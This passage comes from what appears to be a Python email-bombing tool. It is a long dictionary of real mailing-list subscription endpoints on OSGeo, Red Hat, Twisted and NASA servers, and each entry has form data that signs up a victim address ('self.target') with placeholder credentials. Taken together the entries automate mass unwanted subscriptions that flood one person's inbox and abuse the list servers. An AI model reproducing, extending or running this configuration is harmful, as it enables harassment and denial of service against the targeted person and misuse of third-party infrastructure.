                'url': 'https://lists.osgeo.org/mailman/subscribe/cordoba',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/cordoba',
                'key': 'configuraci\u00f3n',
                'data': {
                    'sub_form_token': '1611260256::c5cc5ef02679cc6683712c72d076803b810d6547',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades89': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/croatia',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/croatia',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260305::a2ab2bee96cce8518dcbb8758ff966349a033616',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades90': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/danmark',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/danmark',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260335::0f26b98a9e6cfbbe06994405398e6c84d7f4aa8b',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades91': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/discuss',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/discuss',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260371::1118c844d367f63a817ae45ab432fbae61d77ce1',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades92': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/distrs',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/distrs',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260401::5c87715ccbeccb33a786b7917f93d6d72f64c2e4',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades93': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/dotnet',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/dotnet',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260462::7129daf71827154062b486f98a76a5e8dfeb3516',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades94': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/drupal-geo',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/drupal-geo',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260501::cd3ca12b886f750266237e6337733a9f4184dcaf',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades95': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/dutch',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/dutch',
                'key': 'ontvangen',
                'data': {
                    'sub_form_token': '1611260531::9cc752e7ff4d9b25a32085794c6c1a5e40b65032',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades96': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/edu_discuss',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/edu_discuss',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260590::08d996caa370e6fde52aa60c17c25df94e333f4b',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades97': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/distrs',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/distrs',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260401::5c87715ccbeccb33a786b7917f93d6d72f64c2e4',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades98': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/educacao-pt',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/educacao-pt',
                'key': 'recebido',
                'data': {
                    'sub_form_token': '1611260630::dee66c0aa06ba8efab9477033ee74e124ce81ee5',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades99': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/es_norte',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/es_norte',
                'key': 'recibido',
                'data': {
                    'sub_form_token': '1611260724::bd90bb194cc66a2982dc06cd4de73f0fab2e1f03',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades100': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/el',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/el',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260682::65df515d4138b9291029e3a7b781180fbef51da7',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Hades101': {
                'url': 'https://lists.osgeo.org/mailman/subscribe/europe',
                'token_url': 'https://lists.osgeo.org/mailman/listinfo/europe',
                'key': 'received',
                'data': {
                    'sub_form_token': '1611260774::d8511d45a9a4c7c4ab3bc8660a01057cad6c8460',
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xDnPR': {
                'url': 'https://www.redhat.com/mailman/subscribe/queries-open-program',
                'token_url': 'https://www.redhat.com/mailman/listinfo/queries-open-program',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Amjle': {
                'url': 'https://www.redhat.com/mailman/subscribe/rdo-infra-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rdo-infra-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jRiPo': {
                'url': 'https://www.redhat.com/mailman/subscribe/rdo-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rdo-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xrhIn': {
                'url': 'https://www.redhat.com/mailman/subscribe/rdo-newsletter',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rdo-newsletter',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oEhWT': {
                'url': 'https://www.redhat.com/mailman/subscribe/rdu-ev',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rdu-ev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LHbUW': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-apac-gls',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-apac-gls',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cosEw': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-ccm-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-ccm-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MuuAu': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-devel-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-devel-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XjpKc': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-developer-site',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-developer-site',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wNXbI': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-install-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-install-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZqmMF': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mqyTo': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-list-de',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-list-de',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lkvtw': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-migration-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-migration-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mCBnF': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-moc-baremetal',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-moc-baremetal',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vMofm': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-ne-focuspartners',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-ne-focuspartners',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'phtPC': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-netapp',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-netapp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TPOOw': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-ppp-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-ppp-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wFiXy': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-s-pac',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-s-pac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XgrJi': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-s390-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-s390-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FCNKG': {
                'url': 'https://www.redhat.com/mailman/subscribe/redhat-secure-server',
                'token_url': 'https://www.redhat.com/mailman/listinfo/redhat-secure-server',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sicQj': {
                'url': 'https://www.redhat.com/mailman/subscribe/reinvent-chat',
                'token_url': 'https://www.redhat.com/mailman/listinfo/reinvent-chat',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oEiGS': {
                'url': 'https://www.redhat.com/mailman/subscribe/renewal-jp-mc',
                'token_url': 'https://www.redhat.com/mailman/listinfo/renewal-jp-mc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zzIls': {
                'url': 'https://www.redhat.com/mailman/subscribe/reply-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/reply-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wNyry': {
                'url': 'https://www.redhat.com/mailman/subscribe/rest-practices',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rest-practices',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XgGkq': {
                'url': 'https://www.redhat.com/mailman/subscribe/reug-jp',
                'token_url': 'https://www.redhat.com/mailman/listinfo/reug-jp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sDAvN': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-barcap-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-barcap-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sPGfW': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-collab-at-bu',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-collab-at-bu',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WNZgD': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-community-de-berlin',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-community-de-berlin',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ymYth': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-community-de-fra',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-community-de-fra',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WRDsd': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-community-de-hh',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-community-de-hh',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KtmMJ': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-community-de-nrw',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-community-de-nrw',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GcVVI': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-depanalytics',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-depanalytics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'AYUgK': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-moc-bare-metal',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-moc-bare-metal',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oXYmt': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-ms-virt',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-ms-virt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MNGug': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-msr-sales',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-msr-sales',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tHJRC': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-rax-rpcr-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-rax-rpcr-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OuZHk': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-ready',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-ready',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Jvpsf': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-summit',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-summit',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kJXiC': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-symantec-os',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-symantec-os',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'llxCs': {
                'url': 'https://www.redhat.com/mailman/subscribe/rh-telco5g-field-support',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rh-telco5g-field-support',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nxZPy': {
                'url': 'https://www.redhat.com/mailman/subscribe/rha',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rha',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NPGBZ': {
                'url': 'https://www.redhat.com/mailman/subscribe/rha-instructors',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rha-instructors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PJGad': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhcc',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhcc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BFVYQ': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhcc-outage-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhcc-outage-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dKVKr': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhcnhire',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhcnhire',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LYEKl': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhdcontrib',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhdcontrib',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SuVIy': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhea',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhea',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'mzEUt': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel-labs',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel-labs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OnteN': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel-latam-vads',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel-latam-vads',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ohpFF': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel-support-list',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel-support-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LWveD': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel6-isv',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel6-isv',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KGTcd': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel7-htb-program',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel7-htb-program',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RllgA': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhel7-peap',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhel7-peap',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hriNl': {
                'url': 'https://www.redhat.com/mailman/subscribe/rhelv6-announce',
                'token_url': 'https://www.redhat.com/mailman/listinfo/rhelv6-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VdbWk': {
                'url': 'https://twistedmatrix.com/cgi-bin/mailman/subscribe/twisted-python',
                'token_url': 'https://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PVZHL': {
                'url': 'https://twistedmatrix.com/cgi-bin/mailman/subscribe/twisted-web',
                'token_url': 'https://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-web',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hwzQl': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/agcy-mosm-techexchange',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/agcy-mosm-techexchange',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KvJYu': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/arc-italians-group',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/arc-italians-group',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jEQQA': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/arc-sg-proposals',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/arc-sg-proposals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rCAFi': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/armd-cybersecurity-request',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/armd-cybersecurity-request',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zVptw': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/artemisimageryproposals',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/artemisimageryproposals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NRslV': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/edi-platform-developers',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/edi-platform-developers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kPXKs': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/eo-announce',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/eo-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cLCin': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/gesta',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/gesta',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uZCxt': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/go-sci',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/go-sci',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UyCSN': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/helioanalytics-seminar',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/helioanalytics-seminar',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zvLTv': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/ikos',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/ikos',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QmQsx': {
                'url': 'https://lists.nasa.gov/mailman/subscribe/ivv-project-europa-clipper',
                'token_url': 'https://lists.nasa.gov/mailman/listinfo/ivv-project-europa-clipper',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'slTrg': {
